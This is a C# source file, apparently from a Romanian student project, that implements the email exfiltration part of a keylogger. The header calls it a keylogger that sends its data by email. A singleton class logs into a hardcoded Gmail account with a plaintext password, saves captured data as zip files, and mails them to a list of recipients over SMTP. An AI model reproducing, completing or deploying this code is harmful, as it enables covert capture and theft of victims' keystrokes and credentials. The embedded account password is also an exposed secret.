/**************************************************************************
 *                                                                        *
 *  File:        EmailSender.cs                                           *
 *  Copyright:   (c) 2021, Zara Catalin-Ionut                             *
 *  E-mail:      catalinzara99@yahoo.com                                  *
 *  Description: Keylogger application with email sent data.              *
 *               The component that sends the data through email.         *
 *                                                                        *
 *  This code and information is provided "as is" without warranty of     *
 *  any kind, either expressed or implied, including but not limited      *
 *  to the implied warranties of merchantability or fitness for a         *
 *  particular purpose. You are free to use this source code in your      *
 *  applications as long as the original copyright notice is included.    *
 *                                                                        *
 **************************************************************************/
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Mail;
using System.IO;
namespace IP_Proiect
{
    /// <summary>
    /// Clasa ce se ocupa de trimiterea datelor prin email
    /// Design pattern Singleton
    /// </summary>
    public class EmailSender
    {
        private static EmailSender _instance;
        private string _emailsFile = "emails.txt";
        private string _filesPath = "zipFiles//";
        private string _address;
        private string _password;
        private List<string> _emails;
        private SmtpClient _smtp;
        private MailMessage _mailMessage;
        private List<string> _fileNames;

        private EmailSender()
        {
            _address = "ipproiectkeylogger@gmail.com";
            _password = "N-Dimethyltryptamine";
            _emails = new List<string>();
            _fileNames = new List<string>();

            _smtp = new SmtpClient();
            _smtp.Port = 587;
            _smtp.Host = "smtp.gmail.com";
            _smtp.EnableSsl = true;
            _smtp.UseDefaultCredentials = false;
            _smtp.Credentials = new NetworkCredential(_address, _password);
            _smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
        }

        public static EmailSender Instance
        { get { if (_instance == null)
                {
                    _instance = new EmailSender();
                }
                return _instance;
            }
        }
        /// <summary>
        /// Adaug un email in lista de email-uri
        /// </summary>
        /// <param name="email">Adresa de email</param>
        /// <returns></returns>
        public bool AddEmail(string email)
        {
            if (email.Length > 0)
            {
                _emails.Add(email);
                return true;
            }
            return false;
        }
        /// <summary>
        /// Datele trimise prin email vor fi fisiere zip
        /// Aceste fisiere mai intai trebuie sa fie scrise pe disc
        ///     si apoi trimise
        /// </summary>
        /// <param name="data">Fisierul zip ce trebuie trimis</param>
        public void PutArray(byte[] data)
        {

            string name = "file" + _fileNames.Count + ".zip";
            if (!Directory.Exists(_filesPath))
            {
                Directory.CreateDirectory(_filesPath);
            }
            File.WriteAllBytes(_filesPath + name, data);
            _fileNames.Add(name);
        }
        /// <summary>
        /// Trimit fisierele fisierele catre lista de adrese email
        /// </summary>
        public void Send()
        {
            try
            {
                _mailMessage = new MailMessage();
                _mailMessage.From = new MailAddress(_address);
                foreach (string fileName in _fileNames)
                {
                    _mailMessage.Attachments.Add(new Attachment(_filesPath + fileName));
                }
                foreach (string email in _emails)
                {
                    _mailMessage.To.Add(new MailAddress(email));
                }
                _mailMessage.Subject = "Keylogger";
                _mailMessage.Body = "zip files bellow";
                _smtp.Send(_mailMessage);


                Console.Out.WriteLine("Am trimis mesajul Catre:");
                foreach (string email in _emails)
                {
                    Console.Out.WriteLine(email);
                }
            }
            catch (SmtpException smtpException)
            {
                Console.Out.WriteLine("Eroare de trimitere\n" + smtpException.Message);
            }
            catch (Exception exception)
            {
                Console.Out.WriteLine("Eroare la trimitere\n" + exception.Message);
            }
        }
        /// <summary>
        /// Sterg un email din lista
        /// </summary>
        /// <param name="index">pozitia in lista</param>
        public void DeleteEmail(int index)
        {
            try
            {
                _emails.RemoveAt(index);
            }
            catch(IndexOutOfRangeException indexException)
            {
                Console.Out.WriteLine("Index incorect" + indexException.Message);
            }
        }
        /// <summary>
        /// Scriu lista de email-uri intr-un fisier
        /// </summary>
        public void SaveEmails()
        {
            string emails = "";
            foreach (string email in _emails)
            {
                emails += email + "\n";
            }
            File.WriteAllText(_emailsFile, emails);
        }
        /// <summary>
        /// Incarc o lista de email-uri dintr-un fisier
        /// </summary>
        public void LoadEmails()
        {
            try
            {
                string []emails=File.ReadAllLines(_emailsFile);
                _emails.Clear();
                foreach (string email in emails)
                {
                    _emails.Add(email);
                }
            }
            catch (FileNotFoundException fileNotFound)
            {
                Console.Out.WriteLine("Nu gasesc fisierul cu emailuri\n"+fileNotFound.Message);
            }
        }
    }
    
}
